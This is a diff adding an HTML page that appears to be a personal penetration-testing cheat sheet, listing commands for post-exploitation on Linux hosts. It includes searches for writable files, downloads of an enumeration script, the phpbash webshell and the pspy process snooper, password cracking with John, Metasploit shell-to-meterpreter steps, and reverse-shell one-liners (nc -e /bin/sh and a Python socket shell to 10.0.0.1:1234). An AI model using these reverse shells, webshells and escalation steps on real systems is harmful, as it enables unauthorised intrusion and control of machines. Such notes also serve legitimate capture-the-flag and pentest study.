@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+<title>Commands</title>
+<meta charset="utf-8">
+<!-- Font Awesome -->
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
+<!-- Bootstrap core CSS -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
+<!-- Material Design Bootstrap -->
+<link href="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.11/css/mdb.min.css" rel="stylesheet">
+<!-- JQuery -->
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<!-- Bootstrap tooltips -->
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.4/umd/popper.min.js"></script>
+<!-- Bootstrap core JavaScript -->
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.min.js"></script>
+<!-- MDB core JavaScript -->
+<script type="text/javascript" src="https://platform.linkedin.com/badges/js/profile.js" async defer></script>
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdbootstrap/4.8.11/js/mdb.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+<script src="./parallax.js-1.5.0/parallax.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+</head>
+<body>
+<p><strong>#find world writable files. This is a MUST.</strong><br>
+find / -type f -writable 2> /dev/null
+<br>
+<br>
+<strong>#find world writable directories</strong><br>
+find / -type d -writable 2> /dev/null
+<br>
+<br>
+<strong>##using find commands to find secific files</strong><br>
+find / -type f -iname "string" 2>/dev/null
+<br><br>
+    <strong>##find directory with a specific name</strong><br>
+find / -type d -iname "string" 2>/dev/null
+<br><br>
+<strong>#hosting a simple Python server to communicating between victim and attacker</strong>
+<br><br>
+	<strong>--python2--</strong><br>
+	python -m SimpleHTTPServer 80
+<br><br>
+    <strong>--python3--</strong><br>
+	py -m http.server 80
+<br><br>
+    <strong>#easy download for LinEnum.sh (an enumeration script for basic priv enum)--</strong><br>
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+<br><br>
+    <strong>#Easy Download for PHPBASH (a powerful webshell with a proper terminal</strong><br>
+wget https://raw.githubusercontent.com/Arrexel/phpbash/master/phpbash.php
+<br><br>
+    <strong>###NMAP####</strong><br>
+	-sV = service scan( use this to detect what is running on a port)<br>
+	-sC = Script scan<br>
+	-sP = pingSweep. used for discovering ip connections.<br>
+<br>
+    <strong>###stealth snooping tools for running processes on a computer PSPY </strong><br>
+wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
+<br><br>
+    <strong>###NMAPautomator</strong><br>
+EASY but TAKES SOME TIME<br>
+wget https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh
+<br><br>
+    <strong>###install vulners###</strong><br>
+	cd /usr/share/nmap/scripts<br>
+	wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse<br><br>
+    <strong>##directory brute forcing###</strong><br>
+DIRBUSTER IS A COMMON ONE BUT THE GUI ISN'T THE BEST fairly easy to use however<br>
+launch by typing dirbuster into terminal<br><br>
+    <strong>####install gobuster####</strong><br>
+	apt-get install gobuster
+<br><br>
+    <strong>###JOHN TO CRACK ANYTHING###</strong><br>
+john passtocrack.txt --wordlist=/usr/share/wordlist/rockyou.txt<br>
+<br>
+    <strong>####GTFOBINS####</strong><br>
+<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>
+<br><br>
+    <strong>###ippsec.rocks###</strong><br>
+<a href="https://ippsec.rocks/">https://ippsec.rocks/</a>
+<br><br>
+    <strong>###SUDO COMMAND LIST####</strong><br>
+sudo -l
+<br><br>
+    <strong>###adding metasploit modules####</strong><br>
+msfdb init<br>
+cd $HOME/.msf4<br>
+mkdir modules<br>
+cd modules<br>
+mkdir exploits<br>
+cd exploits<br>
+mkdir *exploitName*<br>
+cd *exploitName*<br>
+wget exploit
+<br><br>
+    <strong>###REVERSE SHELLS BABY!!!####</strong><br>
+	quick examples:<br>
+		nc -e /bin/sh attacker 1234<br>
+		python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'<br><br>
+
+		
+    <strong>##FULL LIST OF REVERSE SHELLS####</strong><br>
+<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a><br><br>
+
+    <strong>###SPAWNING a tty shell####</strong><br>
+python -c 'import pty; pty.spawn("/bin/bash")'<br>
+/bin/bash -i
+<br><br>
+    <strong>###FULL LIST####</strong><br>
+<a href="https://netsec.ws/?p=337">https://netsec.ws/?p=337</a> <br>
+<br><br>
+
+    <strong>###how to upgrade from base shell to meterpreter####</strong><br>
+get shell in metasploit<br>
+ctrl Z<br>
+press y then enter<br>
+use /post/multi/manage/shell_to_meterpreter<br>
+set LHOST to your personal host not the loopback<br>
+sessions -i<br>
+find your running session number<br>
+set SESSION *session number*<br>
+run<br>
+"Meterpreter session start on session X"<br>
+sessions -i X<br>
+
+
+
+
+
+
+
+</p> 
+    
+</body>
+</html>
